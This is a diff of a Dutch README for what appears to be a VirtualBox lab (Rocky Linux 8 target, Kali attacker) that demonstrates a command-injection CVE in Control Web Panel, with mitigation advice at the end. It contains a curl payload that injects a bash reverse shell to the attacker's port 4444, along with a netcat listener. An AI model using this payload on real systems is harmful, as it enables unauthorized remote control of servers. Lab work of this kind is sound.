@@ -21,8 +21,8 @@ C:.
 
 Klik op deze [link](https://techloudgeek.com/download/image/?link=https://dlconusc1.linuxvmimages.com/046389e06777452db2ccf9a32efa3760:dldatac/VirtualBox/R/rockylinux/8/RockyLinux_8.5_VBM.7z) en er zal een 7Zip bestand worden gedownload. Als het is gedownload, dan moet u deze eerst unzippen. Hierna ga je naar de uitgepakte folder en verplaats je het .VDI bestand verplaatsen naar [onze VDI folder](./src/VDI-folder/) in onze repo.
 
->*Rocky Linux 8* wordt gebruikt, omdat Enterprise Linux versies vanaf 9 deze exploit hebben gepatched.
->Andere *Red Hat Enterprise Linux 8* gebasseerde besturingsystemen kunnen zoals *Almalinux 8* en *CentOS 8* **zouden** ook moeten werken met deze opstelling.
+> _Rocky Linux 8_ wordt gebruikt, omdat Enterprise Linux versies vanaf 9 deze exploit hebben gepatched.
+> Andere _Red Hat Enterprise Linux 8_ gebasseerde besturingsystemen kunnen zoals _Almalinux 8_ en _CentOS 8_ **zouden** ook moeten werken met deze opstelling.
 
 ### Configuratie host-only adapter
 
@@ -51,6 +51,12 @@ Voer volgend commando uit in jouw PowerShell scherm:
 & '.\Kali Linux.ps1'
 ```
 
+### Aanpassen keyboard
+
+Het default keyboard is `QWERTY`. Indien u wenst kan u het keyboard aanpassen.
+
+Klik linksboven op het Kali logo. Typ dan `keyboard` in en klik enter. Klik op `LayOut` en disable `Use system defaults`. Dan klikt u linksonder op de `+Add`. Zoek naar `Belgian` en klik op `Ok`. Vervolgens klikt u op `English` en klik op `-Remove`.
+
 #### Credentials
 
 **username**=kali
@@ -69,7 +75,7 @@ Voer volgend commando uit in jouw PowerShell scherm:
 
 **Opgepast:**
 
-We hebben ons script zo gemaakt, dat u als gebruiker op `enter` moet duwen als de *Rocky Linux* VM is opgestart. Je kan dit zien, als je de username & password moet ingeven. Je geeft deze in (credentials zie hieronder) en druk dan in je PowerShell venster op `enter`.
+We hebben ons script zo gemaakt, dat u als gebruiker op `enter` moet duwen als de _Rocky Linux_ VM is opgestart. Je kan dit zien, als je de username & password moet ingeven. Je geeft deze in (credentials zie hieronder) en druk dan in je PowerShell venster op `enter`.
 
 #### Credentials
 
@@ -87,22 +93,22 @@ nc -lvnp 4444
 
 ## Exploit uitvoeren vanaf Kali
 
-- Surf naar de website van de *Rocky Linux* en stuur alle output naar onze listener op *Kali*
+- Surf naar de website van de _Rocky Linux_ en stuur alle output naar onze listener op _Kali_
 
 ```bash
 curl --data-urlencode "login=admin\" ; bash -i >& /dev/tcp/$IP_KALI$/4444 0>&1 ; #" http://$IP_ROCKY$/login/index.php
 ```
 
 **Merk op dat**:
-- `$IP_KALI` = IP van de aanvaller (*Kali*)
-- `$IP_ROCKY`=  IP van de kwetsbare machine (*Rocky*)
 
+- `$IP_KALI` = IP van de aanvaller (_Kali_)
+- `$IP_ROCKY`= IP van de kwetsbare machine (_Rocky_)
 
->Het commando `bash -i >& /dev/tcp/$IP_KALI$/4444 0>&1` wordt door onverwachte breaks `;` door de shell uitgevoerd om een reverse shell mogelijk te maken. 
->Dit kan eventueel vervangen worden om andere commando's uit te voeren op de kwetsbare machine.
+> Het commando `bash -i >& /dev/tcp/$IP_KALI$/4444 0>&1` wordt door onverwachte breaks `;` door de shell uitgevoerd om een reverse shell mogelijk te maken.
+> Dit kan eventueel vervangen worden om andere commando's uit te voeren op de kwetsbare machine.
 
 # Hoe sluit je de CVE uit?
 
-De CVE kan worden weggewerkt door de poort van *cwp* niet te laten routeren. Hierdoor heeft enkel het bedrijfsnetwerk toegang tot het dashboard (en de exploit). Zorg ervoor dat je goede *Access Control Lists* hebt, zodat enkel de bevoegde gebruikers toegang hebben. 
+De CVE kan worden weggewerkt door de poort van _cwp_ niet te laten routeren. Hierdoor heeft enkel het bedrijfsnetwerk toegang tot het dashboard (en de exploit). Zorg ervoor dat je goede _Access Control Lists_ hebt, zodat enkel de bevoegde gebruikers toegang hebben.
 
-Uiteraard kan de exploit het makkelijkste verholpen worden door *CWP* te updaten via dnf. 
+Uiteraard kan de exploit het makkelijkste verholpen worden door _CWP_ te updaten via dnf.
